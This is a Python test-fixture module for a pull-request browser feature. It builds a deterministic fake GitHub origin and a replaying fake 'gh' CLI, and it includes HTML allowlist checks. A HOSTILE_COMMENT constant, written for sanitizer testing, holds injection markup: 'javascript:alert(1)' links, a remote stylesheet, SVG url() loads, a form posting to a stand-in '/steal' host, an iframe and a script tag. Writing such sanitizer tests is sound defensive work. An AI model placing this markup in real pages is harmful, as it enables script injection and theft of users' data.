"""A GitHub stand-in for pull-request tests: an origin, a fake ``gh``, and a cached home.

``build_origin`` writes a deterministic bare ``file://`` origin with ``git fast-import``,
so every commit ID is the same on every machine. It stands in for
``https://github.com/octo/demo`` and carries GitHub's own ``refs/pull/<n>/head``:

| PR | Shape | Head | Base the comparison starts from |
| --- | --- | --- | --- |
| 7 | open, from a fork | ``fork_head``, reachable only through ``refs/pull/7/head`` | the mirror's ``topic`` |
| 8 | merged by another account, same repository, one check skipped | ``merged_head``, merged into ``topic`` | ``base.sha``, ``topic`` before the merge |
| 9 | closed, fork deleted | ``closed_head`` | ``base.sha``, a commit no mirrored ref reaches |
| 10 | open draft, same repository | ``draft_head`` on ``wip`` | the mirror's ``topic`` |

``scenario`` answers every ``gh api`` read of those pull requests from
``tests/fixtures/github-pull/responses.json``, scrubbed real responses, and ``gh auth
status`` for one signed-in account, which ``gh api user``, the account check's read,
names too. GraphQL catalog pages contain 102 rows, of which
100 are open and two are closed. Fixed REST list entries remain available for generic
transport tests:

| List | Pages |
| --- | --- |
| ``all`` | one full page, 106 down to 7, with a next link; a second page, 6 and 5 |
| ``open`` | 10 and 7 |
| ``closed`` | 9 and 8 |

Pull requests other than those four appear in a list and have no record.
``install_fake_gh`` writes a ``gh`` that replays a scenario and logs each call; it is a
Python script run by this interpreter. With ``FAKE_GH_ANSWERED`` set, each read is logged
there with the key the scenario answers it by (``graphql:statuses:start``,
``repos/octo/demo/issues/7``, ``auth``, ``stack``) and the status answered. A scenario's
``latency_ms``, pairs of a pattern and milliseconds, makes each read take as long as GitHub
took to answer its kind: the first pattern its key fully matches.

Run as a script, it builds ``<directory>/home``, an application home holding the
mirror and the records of all four pull requests, fetched through the production CLI
path with the fake ``gh`` and a fixed clock, a complete metadata catalog last read
by another account, and ``<directory>/root``::

    github_pull_fixture.py <directory>

With ``--serve``, it serves one of those pull requests from that home for a browser, as
the QA runbook's pull-request page walkthrough does::

    github_pull_fixture.py <directory> --serve <number> <port>

With ``--guided`` the descriptions of 7 and 8 carry guides, and 9's two blocks;
``--guided-stack`` adds a native stack's guide to 10's, for a stack whose top is 10;
``--describe`` then writes one of ``GUIDE_VARIANTS`` or ``BUILT_VARIANTS`` into a cached
description, pinned as the guide already there is::

    github_pull_fixture.py <directory> --describe <number> <variant>
"""

from __future__ import annotations

import asyncio
import contextlib
import copy
import functools
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from collections import defaultdict
from collections.abc import Callable, Generator, Mapping, Sequence
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from itertools import count
from pathlib import Path
from typing import TYPE_CHECKING, Any, Final

if TYPE_CHECKING:
    from metabrowser.builtin_plugins.github.pull_catalog import CatalogState
    from metabrowser.builtin_plugins.github.pull_list import ListedRepository

CANONICAL: Final = "https://github.com/octo/demo"
READER: Final = "octo-reader"
ANOTHER_READER: Final = "someone-else"
FETCHED_AT: Final = datetime(2026, 9, 17, 12, 0, tzinfo=UTC)
RESPONSES: Final = Path(__file__).parent / "fixtures" / "github-pull" / "responses.json"
DEFAULT_BRANCH: Final = "topic"
_WHEN: Final = 1788000000

_FAKE_GH: Final = """#!{python}
import hashlib, json, os, re, sys, time

args = sys.argv[1:]
log = os.environ.get("FAKE_GH_LOG")
answered_log = os.environ.get("FAKE_GH_ANSWERED")
state_path = os.environ["FAKE_GH_STATE"]
with open(os.environ["FAKE_GH_SCENARIO"], encoding="utf-8") as handle:
    scenario = json.load(handle)
try:
    with open(state_path, encoding="utf-8") as handle:
        counts = json.load(handle)
except FileNotFoundError:
    counts = {{}}


def pick(key, value):
    if not isinstance(value, list):
        return value
    index = counts.get(key, 0)
    counts[key] = index + 1
    with open(state_path, "w", encoding="utf-8") as handle:
        json.dump(counts, handle)
    return value[min(index, len(value) - 1)]


if log:
    watched = ("GH_PROMPT_DISABLED", "GH_NO_UPDATE_NOTIFIER", "NO_COLOR", "GH_DEBUG",
               "GH_HOST", "GH_REPO", "GH_FORCE_TTY", "CLICOLOR_FORCE")
    stdin_null = os.path.samestat(os.fstat(0), os.stat(os.devnull))
    with open(log, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({{"args": args, "stdin_null": stdin_null,
                                 "env": {{name: os.environ.get(name) for name in watched}}}}) + "\\n")


def answered(key, status):
    # How long GitHub takes to answer this read, as the scenario records it: the first of
    # its ``latency_ms`` patterns that the read's key matches, and none when none does. The
    # answered log, when a test asks for one, names each read by that key.
    for pattern, delay_ms in scenario.get("latency_ms", []):
        if re.fullmatch(pattern, key):
            time.sleep(delay_ms / 1000)
            break
    if answered_log:
        with open(answered_log, "a", encoding="utf-8") as handle:
            handle.write(json.dumps({{"args": args, "key": key, "status": status}}) + "\\n")


if args == ["stack", "--version"]:
    version = scenario.get("stack_version")
    answered("stack", None)
    if version:
        sys.stdout.write("gh stack version " + version + "\\n")
    sys.exit(0 if version else 1)

if args[:2] == ["auth", "status"]:
    answer = pick("auth", scenario["auth"])
    answered("auth", None)
    sys.stdout.write(answer.get("stdout", ""))
    sys.stderr.write(answer.get("stderr", ""))
    sys.exit(answer.get("exit", 0))

if args[:1] == ["api"]:
    failure = scenario.get("api_failure")
    if failure:
        sys.stderr.write(failure["stderr"])
        sys.exit(failure.get("exit", 1))
    path, match, index, fields = None, None, 1, {{}}
    while index < len(args):
        arg = args[index]
        if arg in ("-f", "-F"):
            key, _, value = args[index + 1].partition("=")
            fields[key] = value
            index += 2
            continue
        if arg in ("--hostname", "--method", "-H", "--jq"):
            if arg == "-H" and args[index + 1].startswith("If-None-Match: "):
                match = args[index + 1].split(": ", 1)[1]
            index += 2
            continue
        if not arg.startswith("-"):
            path = arg
        index += 1
    if path == "graphql":
        if fields.get("query", "").startswith("query PullCore("):
            path = "graphql:core:" + fields.get("number", "missing")
        elif fields.get("query", "").lstrip().startswith("query MetabrowserPullTimeline("):
            path = "graphql:timeline:" + fields.get("number", "missing") + ":" + fields.get("cursor", "start")
        elif fields.get("query", "").startswith("query PullStatus("):
            path = "graphql:status:" + fields.get("number", "missing") + ":" + fields.get("cursor", "start")
        elif fields.get("query", "").startswith("query PullStatuses("):
            # Its pages are in the Pulls tab's order, the only order they are answered in.
            order = "" if "field:UPDATED_AT" in fields["query"] else "unordered-"
            path = "graphql:statuses:" + order + fields.get("cursor", "start")
        elif fields.get("query", "").startswith("query VisiblePullCores("):
            slots = [f"n{{i}}" for i in range(8)]
            path = "graphql:visible-cores:" + ",".join(fields[key] for key in slots if key in fields)
        else:
            query = fields.get("query", "")
            tail = query.split("page:pullRequests", 1)[-1]
            if "field:UPDATED_AT" in tail and query.startswith("query CatalogActivity("):
                state = "closed" if "states:[CLOSED,MERGED]" in tail else "open" if "states:OPEN" in tail else "activity"
            else:
                state = "updated" if "field:UPDATED_AT" in tail else "all"
            path = "graphql:" + state + ":" + fields.get("cursor", "start")
        if fields.get("owner", "").casefold() != "octo" or fields.get("name", "").casefold() != "demo":
            path = "graphql:unavailable-repository"
    if path == "user" and "user" not in scenario["api"]:
        # The account check's read (gh.gh_account). It names the login the scenario's
        # ``auth`` answer does, from the same sequence ``gh auth status`` draws on, with
        # an ETag that is the login's own, so the same login answers 304.
        # A gh too old for ``auth status --json`` answers ``gh api user`` as any does, so
        # a scenario whose ``auth`` is that refusal is such a gh signed out: the account
        # check then asks ``gh auth status`` why, and that is the refusal it meets. One
        # that is signed in answers from an ``api`` entry for ``user``.
        answer = pick("auth", scenario["auth"])
        too_old = "unknown flag" in answer.get("stderr", "")
        if answer.get("exit", 0) != 0 and not too_old:
            sys.stderr.write(answer.get("stderr", ""))
            sys.exit(answer["exit"])
        hosts = [] if too_old else (
            json.loads(answer["stdout"]).get("hosts", {{}}).get("github.com", []))
        active = next((host for host in hosts if host.get("active")), None)
        if active is None:
            sys.stderr.write("To get started with GitHub CLI, please run:  gh auth login\\n")
            sys.exit(4)
        if active.get("state") != "success" and "401" not in str(active.get("error")):
            sys.stderr.write("error connecting to api.github.com\\n")
            sys.exit(1)
        if active.get("state") != "success":
            entry = {{"status": 401, "body": {{"message": "Bad credentials"}}}}
        else:
            entry = {{"status": 200, "headers": {{"Etag": '"user-' + active["login"] + '"'}},
                     "body": {{"login": active["login"], "id": 1, "type": "User"}}}}
    else:
        missing = {{"status": 404, "body": {{"message": "Not Found"}}}}
        issue = re.fullmatch(r"(repos/[^/]+/[^/]+)/issues/([0-9]+)", path or "")
        if issue and path not in scenario["api"]:
            # A probe's read (pulls.probe_path): the pull request as its issue carries it,
            # from the scenario's answer for the pull. It embeds no repository, so its
            # ETag is its own fields' and a push that moves the pull's ETag leaves it
            # alone, as measured on 2026-11-23 (pulls.PROBE_RESOURCE).
            pull = scenario["api"].get(issue.group(1) + "/pulls/" + issue.group(2), missing)
            entry = pick(path, pull)
            if entry["status"] == 200 and isinstance(entry.get("body"), dict):
                body = {{key: entry["body"].get(key) for key in ("number", "updated_at", "state", "title")}}
                body["pull_request"] = {{"merged_at": entry["body"].get("merged_at")}}
                tag = hashlib.sha256(json.dumps(body, sort_keys=True).encode()).hexdigest()[:32]
                headers = {{**entry.get("headers", {{}}), "Etag": 'W/"issue-' + tag + '"'}}
                entry = {{"status": 200, "headers": headers, "body": body}}
        else:
            entry = pick(path, scenario["api"].get(path, missing))
    status = entry["status"]
    headers = dict(entry.get("headers", {{}}))
    body = entry["raw"].encode() if "raw" in entry else json.dumps(entry.get("body", None)).encode()
    if match is not None and headers.get("Etag") == match:
        status, body = 304, b""
    answered(path or "", status)
    reason ={{200: "OK", 304: "Not Modified", 401: "Unauthorized", 403: "Forbidden", 404: "Not Found",
              429: "Too Many Requests"}}.get(status, "Status")
    out = f"HTTP/2.0 {{status}} {{reason}}\\n".encode()
    for name, value in headers.items():
        out += f"{{name}}: {{value}}\\r\\n".encode()
    out += b"\\r\\n" + (body if status != 304 else b"")
    sys.stdout.buffer.write(out)
    if 200 <= status < 300:
        sys.exit(0)
    sys.stderr.write(f"gh: HTTP {{status}}\\n")
    sys.exit(1)

sys.stderr.write("fake gh: unexpected arguments\\n")
sys.exit(2)
"""


@dataclass(frozen=True, slots=True)
class Origin:
    """The origin repository and the commits the tests name."""

    path: Path
    commits: Mapping[str, str]

    @property
    def url(self) -> str:
        return f"file://{self.path.resolve()}"

    def __getitem__(self, name: str) -> str:
        return self.commits[name]


def git_env(root: Path) -> dict[str, str]:
    env = {name: value for name, value in os.environ.items() if not name.startswith("GIT_")}
    env["GIT_CONFIG_GLOBAL"] = str(root / ".gitconfig-absent")
    env["GIT_CONFIG_SYSTEM"] = str(root / ".gitconfig-absent")
    return env


def _commit(
    ref: str,
    mark: int,
    message: str,
    files: Mapping[str, str],
    *,
    parent: int | None,
    merge: int | None = None,
) -> bytes:
    stream = f"commit {ref}\nmark :{mark}\n"
    stream += f"committer Origin <origin@example.invalid> {_WHEN + mark * 3600} +0000\n"
    stream += f"data {len(message)}\n{message}\n"
    if parent is not None:
        stream += f"from :{parent}\n"
    if merge is not None:
        stream += f"merge :{merge}\n"
    for name, body in files.items():
        data = body.encode()
        stream += f"M 100644 inline {name}\ndata {len(data)}\n{body}\n"
    return (stream + "\n").encode()


def build_origin(directory: Path, *, more: Mapping[str, str] | None = None) -> Origin:
    """The origin; every pull-request ref is written the way GitHub writes it.

    *more* are files pull request 7's head adds besides its own, for a guide that cites them
    (:func:`build_home` with *documents*); every other build leaves the recipe as it is.
    """

    origin = directory / "github-pull-origin.git"
    env = git_env(directory)
    subprocess.run(
        ["git", "init", "-q", "--bare", "--template=", "-b", DEFAULT_BRANCH, str(origin)],
        check=True,
        capture_output=True,
        env=env,
    )
    topic = f"refs/heads/{DEFAULT_BRANCH}"
    stream = b"".join(
        [
            _commit(
                topic,
                1,
                "base",
                {"README.md": "# Demo\n", "src/app.txt": "one\n", "docs/guide.md": "# Guide\n"},
                parent=None,
            ),
            _commit(topic, 2, "topic moves", {"README.md": "# Demo\n\nOn topic.\n"}, parent=1),
            _commit("refs/pull/7/head", 3, "extra", {"src/app.txt": "one\nextra\n"}, parent=1),
            _commit(
                "refs/pull/7/head",
                4,
                "count to two",
                {"src/app.txt": "one\ntwo\n", "docs/new.md": "# New\n", **(more or {})},
                parent=3,
            ),
            _commit(
                "refs/pull/8/head",
                5,
                "more guide",
                {"docs/guide.md": "# Guide\n\nMore.\n"},
                parent=1,
            ),
            _commit(topic, 6, "Merge pull request #8", {}, parent=2, merge=5),
            _commit("refs/keep/rewritten", 7, "rewritten base", {"src/other.txt": "x\n"}, parent=1),
            _commit("refs/pull/9/head", 8, "spam", {"src/app.txt": "one\nspam\n"}, parent=1),
            _commit("refs/heads/wip", 9, "draft", {"docs/draft.md": "# Draft\n"}, parent=6),
            b"reset refs/pull/10/head\nfrom :9\n\n",
            b"done\n",
        ]
    )
    subprocess.run(
        ["git", "--git-dir", str(origin), "fast-import", "--quiet", "--done"],
        check=True,
        capture_output=True,
        input=stream,
        env=env,
    )

    def rev(ref: str) -> str:
        return subprocess.run(
            ["git", "--git-dir", str(origin), "rev-parse", ref],
            check=True,
            capture_output=True,
            text=True,
            env=env,
        ).stdout.strip()

    commits = {
        "base": rev(f"{topic}~1^1"),
        "topic_before_merge": rev(f"{topic}^1"),
        "topic": rev(topic),
        "fork_earlier": rev("refs/pull/7/head^"),
        "fork_head": rev("refs/pull/7/head"),
        "merged_head": rev("refs/pull/8/head"),
        "rewritten_base": rev("refs/keep/rewritten"),
        "closed_head": rev("refs/pull/9/head"),
        "draft_head": rev("refs/pull/10/head"),
    }
    return Origin(origin, commits)


def copy_origin(built: Origin, directory: Path) -> Origin:
    """A private copy of *built* in *directory*, for a test that fetches from or moves it.

    The commits are a function of the recipe, so the copy names the same ones. One build
    serves a whole test session and ``pull_origin`` in ``tests/conftest.py`` hands each
    test a copy: measured on 2026-10-01, at a load average near 50, ``build_origin``
    took a median 0.55 s for its eleven Git commands and the copy 0.04 s.
    """

    path = directory / built.path.name
    shutil.copytree(built.path, path)
    return Origin(path, built.commits)


def clone_checkout(
    origin: Origin, path: Path, *, remote: str = CANONICAL + ".git", branch: str = "wip"
) -> Path:
    """A checkout of the stand-in origin, as a reader's clone of the repository is.

    Its ``origin`` names *remote*, the GitHub address, while its objects came from the
    local origin. On ``wip`` its ``HEAD`` is pull request 10's head, and it holds 8's,
    which ``topic`` merged; it lacks 7's and 9's, which only their pull-request refs reach.
    """

    env = git_env(path.parent)
    subprocess.run(
        ["git", "clone", "-q", "--template=", origin.url, str(path)],
        check=True,
        capture_output=True,
        env=env,
    )
    for args in (("remote", "set-url", "origin", remote), ("checkout", "-q", branch)):
        subprocess.run(["git", "-C", str(path), *args], check=True, capture_output=True, env=env)
    return path


def _etag(path: str, body: object) -> str:
    digest = hashlib.sha256(path.encode() + json.dumps(body, sort_keys=True).encode()).hexdigest()
    return f'W/"{digest}"'


def ok(path: str, body: object, headers: Mapping[str, str] | None = None) -> dict[str, Any]:
    """A ``200`` with a deterministic ETag and GitHub's rate-limit headers."""

    return {
        "status": 200,
        "headers": {
            "Etag": _etag(path, body),
            "X-Ratelimit-Limit": "5000",
            "X-Ratelimit-Remaining": "4999",
            "X-Ratelimit-Reset": "1790181960",
            **(headers or {}),
        },
        "body": body,
    }


def _substitute(value: Any, names: Mapping[str, str]) -> Any:
    if isinstance(value, str):
        for placeholder, commit in names.items():
            value = value.replace(placeholder, commit)
        return value
    if isinstance(value, list):
        return [_substitute(item, names) for item in value]  # pyright: ignore[reportUnknownVariableType]
    if isinstance(value, dict):
        return {key: _substitute(item, names) for key, item in value.items()}  # pyright: ignore[reportUnknownVariableType]
    return value


def recorded_responses() -> dict[str, Any]:
    with RESPONSES.open(encoding="utf-8") as handle:
        return json.load(handle)


def pull_bodies(origin: Origin) -> dict[int, dict[str, Any]]:
    """The API's view of each pull request, keyed by number."""

    template = recorded_responses()
    fork = _substitute(
        template,
        {
            "@HEAD@": origin["fork_head"],
            "@BASE@": origin["topic_before_merge"],
            "@EARLIER@": origin["fork_earlier"],
        },
    )
    pulls: dict[int, dict[str, Any]] = {7: fork}
    merged = copy.deepcopy(fork)
    merged["pull"].update(
        number=8,
        state="closed",
        merged=True,
        # Merged by someone other than its author, as github.com's header then says.
        merged_by={"login": "octo"},
        commits=1,
        mergeable=None,
        merge_commit_sha=origin["topic"],
        title="Say more in the guide",
        body="",
        labels=[],
        user={"login": "maintainer"},
        merged_at="2026-09-16T18:00:00Z",
        closed_at="2026-09-16T18:00:00Z",
        html_url=f"{CANONICAL}/pull/8",
        base={
            "ref": "topic",
            "sha": origin["topic_before_merge"],
            "repo": {"full_name": "octo/demo"},
        },
        head={
            "ref": "guide-more",
            "sha": origin["merged_head"],
            "repo": {"full_name": "octo/demo"},
        },
    )
    # Its docs job was skipped, as cli/cli#14128's 13 skipped runs were: GitHub counts
    # skipped checks apart from neutral ones.
    merged_checks = copy.deepcopy(fork["check_runs"])
    merged_checks["check_runs"][1].update(status="completed", conclusion="skipped")
    pulls[8] = {
        **merged,
        "issue_comments": [],
        "reviews": [],
        "review_comments": [],
        "check_runs": merged_checks,
    }
    closed = copy.deepcopy(fork)
    closed["pull"].update(
        number=9,
        state="closed",
        commits=1,
        mergeable=None,
        title="spam",
        body=None,
        # GitHub's default "invalid" label, with no description, so its chip has no tooltip.
        labels=[{"name": "invalid", "color": "e4e669", "description": None}],
        user=None,
        closed_at="2026-09-16T19:00:00Z",
        html_url=f"{CANONICAL}/pull/9",
        base={"ref": "topic", "sha": origin["rewritten_base"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "spam", "sha": origin["closed_head"], "repo": None},
    )
    pulls[9] = {**closed, "issue_comments": [], "reviews": [], "review_comments": []}
    draft = copy.deepcopy(fork)
    draft["pull"].update(
        number=10,
        draft=True,
        commits=1,
        mergeable=False,
        title="WIP: draft the next page",
        body="Not ready.",
        labels=[],
        user={"login": "maintainer"},
        html_url=f"{CANONICAL}/pull/10",
        base={"ref": "topic", "sha": origin["topic"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "wip", "sha": origin["draft_head"], "repo": {"full_name": "octo/demo"}},
    )
    empty_checks = {"total_count": 0, "check_runs": []}
    pending = {"state": "pending", "total_count": 0, "statuses": []}
    pulls[10] = {
        **draft,
        "issue_comments": [],
        "reviews": [],
        "review_comments": [],
        "check_runs": empty_checks,
        "status": pending,
    }
    return pulls


# A comment written to attack the pull-request page: markup that loads on render (a
# stylesheet, images, media, frames, SVG paint servers and filters with `url()`),
# rewrites a link (SVG SMIL), reaches the application's own styling and document-wide
# handlers (`class`, `data-*`), names an element for scripts (`id`, `name`), reports a
# click (`ping`, `attributionsrc`), styles itself, or submits. Its first line is ordinary
# Markdown that must survive.
HOSTILE_COMMENT: Final = (
    "Rebased on `topic`; see [the docs](docs/new.md).\n\n"
    '<link rel="stylesheet" href="http://127.0.0.1:9/evil.css"><style>p{color:red}</style>\n'
    '<img src="https://example.com/badge.png" alt="build badge"> <img src="javascript:alert(1)">\n'
    '<a id="metabrowser" name="settings" href="https://example.com/x" ping="https://e.x/p"'
    ' attributionsrc="https://e.x/a">x</a>\n'
    '<svg width="10" height="10"><rect width="10" height="10" fill="url(http://e.x/f#p)"'
    ' stroke="url(http://e.x/s#p)" marker-start="url(http://e.x/m#p)"'
    ' filter="url(http://e.x/fi#p)" mask="url(http://e.x/ma#p)"'
    ' clip-path="url(http://e.x/c#p)"/><use href="#kpress-icon-copy"></use>'
    '<a href="#x"><set attributeName="href" to="javascript:alert(1)"/>'
    '<animate attributeName="href" values="javascript:alert(1)"/>s</a></svg>\n'
    '<div data-kpress-video-id="dQw4w9WgXcQ">video</div>'
    '<span data-mb-copy="evil" data-nav-dir="up">copy</span>'
    '<div class="modal-overlay">fake dialog</div>'
    '<p style="cursor:url(http://e.x/c.png),auto">styled</p>\n'
    '<form action="https://e.x/steal"><input name="q" src="https://e.x/i.png"></form>'
    '<iframe src="https://e.x/f"></iframe><video src="https://e.x/v.mp4"></video>'
    "<script>alert(1)</script>\n"
)


def allowlist_violations(html: str, *, images: bool = False, pr_text: bool = False) -> list[str]:
    """Every tag and attribute in *html* the page may not insert, parsed as HTML.

    The allowlist is :mod:`metabrowser.inert_html`'s. An image from the web is always
    admitted, as an ``https`` address with no referrer sent; *images* also admits one
    inside the served tree, which a document keeps and a pull-request comment never does.
    Every link must leave for http(s) or stay inside the served tree, a heading's ``id``
    must be one of the hardener's anchors, an image's ``loading`` must be ``lazy``, a
    span may only be the image fallback's, an input only a disabled checkbox, and a layout
    attribute (``align``, ``width``, ``height``) must hold a value the hardener keeps.
    """

    from html.parser import HTMLParser

    from metabrowser.inert_html import (
        ALLOWED_ATTRIBUTES,
        ALLOWED_TAGS,
        ANCHOR_PREFIX,
        CHECKBOX_ATTRIBUTES,
        IMAGE_FALLBACK_CLASS,
        PATH_RELATIVE_LINK,
        allowed_attributes,
        is_inside,
    )

    tags = ALLOWED_TAGS | {"img", "input"}
    found: list[str] = []

    class _Check(HTMLParser):
        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            if tag not in tags:
                found.append(f"<{tag}>")
            if tag == "input" and [
                (name, value or "") for name, value in attrs if name != "checked"
            ] != list(CHECKBOX_ATTRIBUTES):
                found.append(f"input{attrs}")
            if tag == "img":
                written = dict(attrs)
                if (written.get("src") or "").startswith("https://"):
                    if written.get("referrerpolicy") != "no-referrer":
                        found.append("img[referrerpolicy missing]")
                elif not images:
                    found.append("<img>")
            for name, value in attrs:
                if pr_text and tag == "a" and name == PATH_RELATIVE_LINK and value == "":
                    continue
                if name not in ALLOWED_ATTRIBUTES.get(tag, ()):
                    found.append(f"{tag}[{name}]")
                elif name == "id" and not (value or "").startswith(ANCHOR_PREFIX):
                    found.append(f"{tag}[id={value}]")
                elif name == "loading" and value != "lazy":
                    found.append(f"{tag}[loading={value}]")
                elif name == "referrerpolicy" and value != "no-referrer":
                    found.append(f"{tag}[referrerpolicy={value}]")
                elif name == "class" and value != IMAGE_FALLBACK_CLASS:
                    found.append(f"{tag}[class={value}]")
                elif name == "data-tip-text" and not (value or "").startswith(
                    ("https://", "http://")
                ):
                    found.append(f"{tag}[data-tip-text={value}]")
                elif name in {"align", "width", "height"}:
                    # A layout attribute holds what the hardener would keep of it.
                    kept = allowed_attributes(tag, {name: value}, None)
                    if (name, value or "") not in kept:
                        found.append(f"{tag}[{name}={value}]")
                elif name in {"href", "src"} and not (
                    (value or "").startswith(("https://", "http://")) or is_inside(value)
                ):
                    found.append(f"{tag}[{name}={value}]")
            if tag == "img" and not any(name == "loading" for name, _value in attrs):
                found.append("img[loading missing]")

    checker = _Check()
    checker.feed(html)
    checker.close()
    return found


def html_tree(html: str) -> list[Any]:
    """*html* parsed as HTML into nested ``{"tag", "attrs", "children"}`` nodes and text.

    Browserless sessions build a template from it, so the page's own defense runs on a
    real parse of what KPress sends rather than on a parse the session does itself.
    """

    from html.parser import HTMLParser

    void = {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
    root: dict[str, Any] = {"children": []}
    stack = [root]

    class _Build(HTMLParser):
        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            node = {"tag": tag, "attrs": [[k, v or ""] for k, v in attrs], "children": []}
            stack[-1]["children"].append(node)
            if tag not in void:
                stack.append(node)

        def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            node = {"tag": tag, "attrs": [[k, v or ""] for k, v in attrs], "children": []}
            stack[-1]["children"].append(node)

        def handle_endtag(self, tag: str) -> None:
            for depth in range(len(stack) - 1, 0, -1):
                if stack[depth].get("tag") == tag:
                    del stack[depth:]
                    break

        def handle_data(self, data: str) -> None:
            stack[-1]["children"].append(data)

    builder = _Build(convert_charrefs=True)
    builder.feed(html)
    builder.close()
    return root["children"]


def page(path: str) -> str:
    return f"{path}?per_page=100&page=1"


def logged_gh_calls(directory: Path) -> list[str]:
    """What the fake ``gh`` was asked since the last call, as a transcript lists it.

    The scan of every open pull request's status is a job of its own, which a list's ask
    starts beside the list's, so its pages reach the log anywhere among the list's reads:
    they are listed last, in the order they were read, one after another.
    """

    log = directory / "fake-gh-log.jsonl"
    if not log.exists():
        return []
    calls: list[str] = []
    for line in log.read_text(encoding="utf-8").splitlines():
        args: list[str] = json.loads(line)["args"]
        if args == ["stack", "--version"]:
            calls.append("gh stack --version")
            continue
        if args[:2] == ["auth", "status"]:
            calls.append("gh auth status")
            continue
        if "graphql" in args:
            fields = dict(arg.split("=", 1) for arg in args if "=" in arg)
            if fields.get("query", "").startswith("query PullCore("):
                calls.append(f"gh api graphql core number={fields.get('number', 'missing')}")
                continue
            if fields.get("query", "").lstrip().startswith("query MetabrowserPullTimeline("):
                calls.append(
                    f"gh api graphql timeline number={fields.get('number', 'missing')} "
                    f"cursor={fields.get('cursor', 'start')}"
                )
                continue
            if fields.get("query", "").startswith("query PullStatus("):
                calls.append(
                    f"gh api graphql status number={fields.get('number', 'missing')} "
                    f"cursor={fields.get('cursor', 'start')}"
                )
                continue
            if fields.get("query", "").startswith("query PullStatuses("):
                calls.append(f"gh api graphql statuses cursor={fields.get('cursor', 'start')}")
                continue
            if fields.get("query", "").startswith("query VisiblePullCores("):
                slots = [f"n{i}" for i in range(8)]
                numbers = ",".join(fields[key] for key in slots if key in fields)
                calls.append(f"gh api graphql visible-cores numbers={numbers}")
                continue
            query = fields.get("query", "")
            tail = query.split("page:pullRequests", 1)[-1]
            state = (
                "updated"
                if "field:UPDATED_AT" in tail and not query.startswith("query CatalogActivity(")
                else "closed"
                if "states:[CLOSED,MERGED]" in tail
                else "open"
                if "states:OPEN" in tail
                else "all"
            )
            calls.append(
                f"gh api graphql catalog state={state} cursor={fields.get('cursor', 'start')}"
            )
            continue
        path = next(arg for arg in args if arg == "user" or arg.startswith("repos/"))
        if "--jq" in args:
            calls.append(f"gh api {path} --jq {args[args.index('--jq') + 1]}")
            continue
        conditional = any(arg.startswith("If-None-Match: ") for arg in args)
        calls.append(f"gh api {path}" + (" (If-None-Match)" if conditional else ""))
    log.unlink()
    scanned = [call for call in calls if call.startswith(_STATUS_SCAN)]
    return [call for call in calls if not call.startswith(_STATUS_SCAN)] + scanned


# What a first clone of octo/demo asks gh, in order: the GitHub status check, then the
# repository's size (`GithubProvider.check_first_clone`). A command that clones and
# should otherwise ask GitHub nothing logs exactly these.
FIRST_CLONE_GH_CALLS: Final[list[str]] = [
    "gh auth status",
    "gh api repos/octo/demo --jq .size",
]


def in_a_stable_order(calls: list[str]) -> list[str]:
    """The log's calls, with those that run together in one order.

    A refresh reads the pull first, for its head, and then its other parts in flight
    together, which reach the log in whatever order the processes did. Only those parts
    are sorted: a list's pages are read one after another, and their order is pinned.
    The list probe, which runs beside all of it, is listed first.
    """

    # The list probe a page's automatic ask starts runs beside that ask's own work
    # (`attend_list`), so it reaches the log anywhere among it: it is listed first. The scan
    # of every open pull request's status, a job of its own a list's ask starts beside the
    # list's, reaches it anywhere too, its pages one after another: they are listed last.
    beside = [call for call in calls if _LIST_PROBE.match(call)]
    scanned = [call for call in calls if call.startswith(_STATUS_SCAN)]
    ordered: list[str] = list(beside)
    together: list[str] = []
    for call in calls:
        if _LIST_PROBE.match(call) or call.startswith(_STATUS_SCAN):
            continue
        if _RECORD_PART.match(call):
            together.append(call)
            continue
        ordered.extend(sorted(together))
        together = []
        ordered.append(call)
    ordered.extend(sorted(together))
    return [*ordered, *scanned]


_STATUS_SCAN: Final = "gh api graphql statuses "
_LIST_PROBE = re.compile(r"gh api repos/[^/]+/[^/]+/(issues|pulls)\?state=all&sort=updated&")
# The parts of a record a refresh reads together, after the pull itself, and the pages of
# a head's checks a probe reads together.
_RECORD_PART = re.compile(
    r"gh api repos/[^/]+/[^/]+/"
    r"(issues/\d+/comments|pulls/\d+/comments|pulls/\d+/reviews|commits/[0-9a-f]+/(status|check-runs))\?"
)


def graph_core_data(item: Mapping[str, Any], *, reader: str = READER) -> dict[str, Any]:
    """One fixed GraphQL core response, including test-vs-actual merge commit semantics."""

    def side(prefix: str) -> dict[str, Any] | None:
        repository = item[prefix].get("repo")
        return None if repository is None else {"nameWithOwner": repository["full_name"]}

    merge_oid = item.get("merge_commit_sha")
    return {
        "viewer": {"login": reader},
        "repository": {
            "id": "R_demo",
            "nameWithOwner": "octo/demo",
            "pull": {
                "number": item["number"],
                "url": item["html_url"],
                "title": item["title"],
                "body": item.get("body"),
                "state": "MERGED" if item.get("merged") else item["state"].upper(),
                "isDraft": item.get("draft", False),
                "merged": item.get("merged", False),
                "author": item.get("user"),
                "mergedBy": item.get("merged_by"),
                "commits": {"totalCount": item.get("commits")},
                "mergeCommit": {"oid": merge_oid} if item.get("merged") and merge_oid else None,
                "potentialMergeCommit": {"oid": merge_oid}
                if not item.get("merged") and merge_oid
                else None,
                "labels": {"nodes": item.get("labels", [])},
                "baseRefName": item["base"]["ref"],
                "baseRefOid": item["base"]["sha"],
                "baseRepository": side("base"),
                "headRefName": item["head"]["ref"],
                "headRefOid": item["head"]["sha"],
                "headRepository": side("head"),
                **{
                    field + "At": item.get(field + "_at")
                    for field in ("created", "updated", "closed", "merged")
                },
            },
        },
    }


def graph_core_entry(item: Mapping[str, Any], *, reader: str = READER) -> dict[str, Any]:
    """The explicit fake-gh entry for its separately named fixed core query."""
    return ok(f"graphql:core:{item['number']}", {"data": graph_core_data(item, reader=reader)})


# GitHub's ``CheckRunState`` and ``StatusState``, every one of which its counts by state
# name, zero or not.
_CHECK_RUN_STATES: Final = (
    "ACTION_REQUIRED",
    "CANCELLED",
    "COMPLETED",
    "FAILURE",
    "IN_PROGRESS",
    "NEUTRAL",
    "PENDING",
    "QUEUED",
